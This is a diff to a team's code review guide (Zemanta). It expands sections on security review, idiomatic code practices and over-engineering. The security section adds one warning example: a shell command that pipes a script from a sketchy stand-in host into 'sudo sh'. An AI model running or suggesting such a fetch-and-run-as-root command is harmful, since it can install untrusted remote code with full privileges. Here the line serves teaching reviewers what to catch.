@@ -8,7 +8,7 @@ Also knows as peer code reviews are an essential part in the process of:
 
 Quality of code is subjected to many opinions and points of view so in this guide we'll not be explicitly listing down a full and exhaustive list of properties of high quality code but here are a few **very obvious** examples.
 
-### 1.1. Commented out Code
+### 1.1. Redundant Code or Comments
 
 ```python
 def some_function():
@@ -68,13 +68,39 @@ To avoid such instances both the reviewer and the code review submitter have to 
 *Pro tip:* An even more extreme case would be that we wouldn't be solving the right problem in the first place, but that's an issue that lies higher up in the entire engineering process, but pay attention to such cases also.
 
 
-## 3. Preventing potential security issues or introducing harmful code
+## 3. Preventing Potential Security Issues / Vulnerabilities / Introduction of Harmful Code
 
-## 4. Adhering to good and established code practices and patterns
+Here is a classic:
 
-## 5. Preventing over-engineering or premature optimizations
+```bash
+#!/bin/sh
 
-## 6. Detecting potential vulnerabilities
+# install dependencies on production on a machine
+# without proper backup and no means to set it up
+# back automatically
+
+curl "http://sketchy-site.com/im-completely-legit.sh" | sudo sh
+```
+
+By no means we'll be covering all possible vectors that would weaken the security of your systems, just use all your knowledge about possible attack vectors of the code your writing or reviewing and try to prevent the introduction of potentially harmful code.
+
+When submitting a code review that introduces or changes security critical code try to think who on your team has the most knowledge about a particular module or technology and would be able to detect harmful changes. Make sure they also review your code.
+
+## 4. Adhering to Good and Established Code Practices and Patterns
+
+There are plenty of resources out there in the form of guides, books and documentation on what is a good practice and what not. So when reviewing or submitting code try to think if the proposed change-set respects:
+
+* language or framework idioms
+* existing pattern idioms and patterns of the codebase (if they still make sense after your change)
+* language based formats as [PEP8](https://www.python.org/dev/peps/pep-0008/) or [go fmt](https://blog.golang.org/go-fmt-your-code)
+* ...
+
+Pro tip: to get you started here is a short intro to what idiomatic [Python](http://python.net/~goodger/projects/pycon/2007/idiomatic/handout.html), [Go-lang](https://golang.org/doc/effective_go.html) and [JavaScript](http://javascript.crockford.com/code.html) is.
+
+
+## 5. Preventing Over-Engineering or Premature Optimizations
+
+
 
 # Code Review Process at Zemanta
 
